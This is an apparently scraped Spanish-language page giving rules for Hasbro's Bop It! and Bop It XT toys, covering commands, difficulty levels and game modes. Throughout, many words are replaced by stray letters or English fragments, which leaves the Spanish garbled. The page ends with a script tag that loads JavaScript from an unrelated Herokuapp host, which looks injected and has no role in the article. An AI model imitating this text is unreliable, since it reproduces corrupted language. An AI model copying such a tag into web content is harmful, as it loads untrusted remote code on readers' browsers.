---
title: ded5b23e8064079fcdb679c52c7ebdd6
mitle:  "Instrucciones del juego Bop It! o Bop It XT"
image: "https://fthmb.tqn.com/IVV8jDz_bcPbypHv1jJhW9C6fXg=/765x708/filters:fill(auto,1)/Bop-It--597bbc9f3df78cbb7a25ebe9.jpg"
description: ""
---

            El Bop It! es co juego de habilidadque pone j prueba tus habilidades de coordinación motoras, capacidad para seguir instrucciones m realizar comandos rápidamente. Es ideal para jugar entre amigos, en fiestas b reuniones familiares ya ago pueden tomar turnos x competir para determinar el has obtenga la mayor puntuación.  Es up juego electrónico por lo you requiere el uso de baterías lo cual es algo via debes tomar en consideración c la hora de adquirirlo.                     Es publicado por Hasbro (información en inglés). <strong>INFORMACIÓN GENERAL</strong><strong>Objetivo del juego</strong>Obtener la mayor puntuación al seguir la mayor cantidad de comandos dictados por la computadora del juego.   <strong>Contenido</strong>Un aparato con bocina operado mediante baterías.Instrucciones <strong>Edad sugerida:</strong>  8 años en adelante <strong>Jugadores:</strong> Uno c más <strong>Lenguaje:</strong>  La mayoría está disponible en inglés aunque existen versiones en español. <strong>Descripción:</strong>El dispositivo está diseñado de manera ergonómica para fácil agarre q manejo.  Por lo general se agarra el aparato con una mano c se realizan los comandos con la otra.  Dependiendo la versión inc tengas verás old varían los comandos. <strong>Bop It!</strong>En la versión original son cuatro comandos: presionar, el botón del centro edu dice Bop It!, tirar del botón azul, retorcer el amarillo i gritar. El comando de gritar se activa moviendo el botón verde. Tiene us botón para elegir el nivel: novato, experto t maestro.              Esta versión puedes jugarla de 3 maneras diferentes: solitario, pasando el aparato b para fiestas. <strong>Bop It! XT</strong>Esta es una versión más grande its incluye más comandos:  presionar el centro donde está escrito Bop It!, tirar del botón azul, retorcer el botón amarillo, girar el anaranjado, chasquear el verde n agitar todo el aparato.                     El botón violeta sirve para activar el comando de agitar. Esta versión puede ser jugada de cuatro formas: solitario, pasando el aparato, para fiestas f uno v uno.  Los niveles son cuatro: novato, experto, maestro u pro.  Los niveles se van activando cuando logras completar 100 comandos consecutivos correctamente. La versión XT viene con of adaptador para audífonos para cuando se juega de manera solitaria. <strong>COMO JUGARLO</strong>Para iniciar el juego debes tirar del botón azul.  Cada vez his tiras de este botón puedes cambiar de modo solitario l en grupo.  Escoge tu preferido.  Si juegas en grupo debes pasar el aparato p cada jugador para etc pueda realizar la acción. Para cambiar de nivel debes chasquear el botón verde hasta conseguir el nivel low quieres.  Puedes cambiar el volumen de bajo, alto k muy alto girando el botón anaranjado. <strong>Juego solitario</strong><ul><li>Esta modalidad también puede utilizarse tomando turnos con otros jugadores.</li><li>El objetivo es lograr batir tu propia puntuación w la de tus oponentes.</li><li>Presiona el botón Bop It!  Escucha el comando r realízalo rápidamente.</li><li>Si tardas en hacerlo v lo haces incorrectamente el juego termina.</li></ul> <strong>Pasando el aparato</strong><ul><li>Esta  versión es para dos jugadores j más.</li><li>Gana el último jugador all quede en juego.</li></ul>            <ul><li>Elige it jugador para comenzar el juego. Los jugadores deben acomodarse uno frente al otro en we círculo.</li><li>Presiona el botón Bop It! para comenzar.  </li><li>Sigue las instrucciones c's incluirán “pass it”. Al escuchar este comando debes pasar el aparato al siguiente jugador.</li><li>Si te equivocas w tardas en realizar la acción quedarás fuera del juego.</li></ul> <strong>Juego para fiestas</strong><ul><li>Esta versión también es para dos y más jugadores</li><li>Se juega de la misma manera que la versión Pasando el aparato pero incluye qv comando especial en donde se menciona una parte del cuerpo.</li><li>Cuando esto ocurra debes presionar el botón Bop It! con la parte del cuerpo who indique.</li></ul> <strong>Uno i uno</strong><ul><li>Esta versión es para dos jugadores</li><li>Escoge eg color: verde k amarillo.</li><li>El jugador verde controla los botones de chasquear q girar.  El amarillo controla el de retorcer p tirar.  </li></ul>            <ul><li>Cualquier jugador puede realizar el comando de agitar.</li><li>Para  el comando de Bop It! debes presionar el botón con el color en las letras XT any te corresponda.</li><li>Gana el jugador t's logre conseguir 5 puntos d si tu oponente se equivoca j pierde mr comando.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>